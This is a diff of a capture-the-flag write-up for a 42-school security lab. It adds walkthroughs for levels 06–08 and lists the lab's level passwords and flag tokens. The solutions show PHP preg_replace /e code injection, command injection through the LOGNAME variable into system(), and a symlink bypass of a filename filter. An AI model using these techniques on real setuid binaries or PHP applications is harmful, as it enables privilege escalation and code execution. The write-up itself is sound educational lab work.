@@ -9,14 +9,18 @@ level05  ne2searoevaevoem4ov4ar8ap
 level06  viuaaale9huek52boumoomioc
 level07  wiok45aaoguiboiki2tuin6ub
 level08  fiumuikeil55xe9cu4dood66h
+level09  25749xKZ8L7DkSCwJkT9dyv6f 
 
 flag00  nottoohardhere 
 flag01  abcdefg
 flag02  ft_waNDReL0L
+flag08  quif5eloekouj29ke0vouxean 😑
 ```
 
 
 
+
+Subject [PDF](https://cdn.intra.42.fr/pdf/pdf/67635/en.subject.pdf) 
 
 # SSH
 
@@ -454,9 +458,14 @@ Login
 ```b
 > ssh level06@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
 > Password: viuaaale9huek52boumoomioc
+> ls -l
+-rwsr-x---+ 1 flag06 level06 7503 level06
+-rwxr-x---  1 flag06 level06  356 level06.php
 ```
 
-Inspect (there are 2 files)
+There are 2 files.
+
+Inspect:
 
 ```b
 > file level06
@@ -480,7 +489,6 @@ function y($m) {
   $m = preg_replace("/@/", " y", $m);
   return $m;
 }
-
 function x($y, $z) {
   $a = file_get_contents($y);
   $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
@@ -488,14 +496,204 @@ function x($y, $z) {
   $a = preg_replace("/\]/", ")", $a);
   return $a;
 }
-
-$r = x($argv[1], $argv[2]); print $r;
-
+$r = x($argv[1], $argv[2]);
+print $r;
 ?>
 ```
 
-🟡 notes in `sea` 
+Inspect `y` function
+
+```b
+function y($m) {
+  $m = preg_replace("/\./", " x ", $m);
+  $m = preg_replace("/@/", " y", $m);
+  return $m;
+}
+```
+
+Function `y` filters m twice
+1. `" x "` replaces all regex `/./`
+2. `" y"` replaces all regex `/@/`
+
+Inspect `x` function
+
+```b
+function x($y, $z) {
+  $a = file_get_contents($y);
+  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+  $a = preg_replace("/\[/", "(", $a);
+  $a = preg_replace("/\]/", ")", $a);
+  return $a;
+}
+```
+
+Function `x` filters `argv[1]`
+1. `"/(\[x (.*)\])/e"`
+    - matches `[x `_cap_`]` and insert 2nd captured group to string `y("`_cap_`")` 
+    - `/e` will eval the `y(\"\\2\")` as PHP code 
+    - :yellow_circle: `/e` modifier only evaluates the replacement string we provide 
+    - :yellow_circle: `/e` is deprecated long ago
+2. `(` and `)` replace all `[` and `]` in the result respectively
+- the func disregards argv[2]
+
+Our goal
+- `file_get_contents($argv[1])` depends on ___content___ of the file 
+- so `argv[1]` to  a FILE 
+- it should be oneline in form of `[x `_cap_`]`
+
+Solution
+
+```b
+# get the _token/flag_ in there to be captured and printed out
+  # shell_exec() system() exec() or simply backticks
+# `getflag` called
+# ${`getflag`} - get the ret
+# [x ${`getflag`}] - framed in this form
+# echo $(oneliner) > /tmp/temp - push it to a FILE
+
+> echo '[x ${`getflag`}]' > /tmp/temp
+> ./level06 /tmp/temp
+```
 
 
-# 07 - Todo
+# 07 
+
+Login
+
+```b
+> ssh level07@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: wiok45aaoguiboiki2tuin6ub
+> ls -l
+-rwsr-sr-x 1 flag07 level07 8805 level07
+```
+
+First thought:
+  - options: (not running it, just to see what it _prints_)
+
+```b
+> file level07
+> strings level07
+> xxd level07 | grep level
+> xxd level07 | grep -A3 -B3 level
+> readelf -s ./level07 | grep -E 'getenv|system|exec|echo|puts|write|printf'
+> objdump -d level07 | grep -E "getenv|system|exec|echo|puts|write|printf"
+                      regex ^^
+```
+
+Using `readelf -p .rodata` and `ltrace`
+- `-p` : `string-dump` displays contents of a section as printable str
+- `.rodata` : `read-only data` section = what we want to see
+
+```b
+> readelf -p .rodata ./level07 
+String dump of section '.rodata':
+  [     8]  LOGNAME
+            ^^^^^^^ 🟡 
+  [    10]  /bin/echo %s 
+```
+```b
+> ltrace ./level07
+
+__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                  = 2007
+geteuid()                                                  = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)        = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)        = 0
+getenv("LOGNAME")                                          = "level07"
+        ^^^^^^^ 🟡 
+asprintf(0xbffff744, 0x8048688, 0xbfffff4b, 0xb7e5ee55, 0xb7fed280) = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                     = 0
++++ exited (status 0) +++
+```
+
+Run it and we found that it prints `LOGNAME`
+
+```b
+> ./level07 whoami
+level07
+> man env
+> env logname
+level06
+> export LOGNAME='`id`'
+> ./level07 
+uid=3007(flag07) gid=2007(level07) groups=3007(flag07),100(users),2007(level07)
+```
+
+Solution
+```b
+> export LOGNAME='`getflag`'
+> ./level07
+```
+
+
+# 08
+
+Login
+
+```b
+> ssh level08@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: fiumuikeil55xe9cu4dood66h
+> ls -l
+-rwsr-s---+ 1 flag08 level08 8617 level08
+-rw-------  1 flag08 flag08    26 token
+              ^^^^^^ ^^^^^^ both flag08, not level08 🟡
+```
+
+2 files:
+
+```b
+> cat token
+cat: token: Permission denied
+
+> ./level08
+./level08 [file to read]
+```
+
+Tryout
+
+```b
+> echo "a" > /tmp/tmp && ./level08 /tmp/tmp
+a
+
+> ltrace ./level08 /tmp/tmp
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("/tmp/tmp", "token")                                = NULL
+open("/tmp/tmp", 0, 014435162522)                          = 3
+read(3, "a\n", 1024)                                       = 2
+write(1, "a\n", 2a
+)                                         = 2
++++ exited (status 2) +++
+```
+
+```b
+> echo "aB" > /tmp/tmp && ./level08 /tmp/tmp
+aB
+
+> ltrace ./level08 /tmp/tmp
+__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("/tmp/tmp", "token")                                = NULL
+open("/tmp/tmp", 0, 014435162522)                          = 3
+read(3, "a\n", 1024)                                       = 2
+write(1, "a\n", 2a
+)                                         = 2
++++ exited (status 2) +++
+```
+
+Observation:
+
+- only the filename matters
+- `./level` will cat the file, as long as filename contains no substr "token"
+- renaming `./token` is not allowed
+- but we can make a symlink of it
+  - syntax: `ln -s real_path_src real_path_symlink`
+
+Solution
+
+```b
+> ln -s `realpath token` /tmp/totem
+> ./level08 /tmp/totem
+```
 
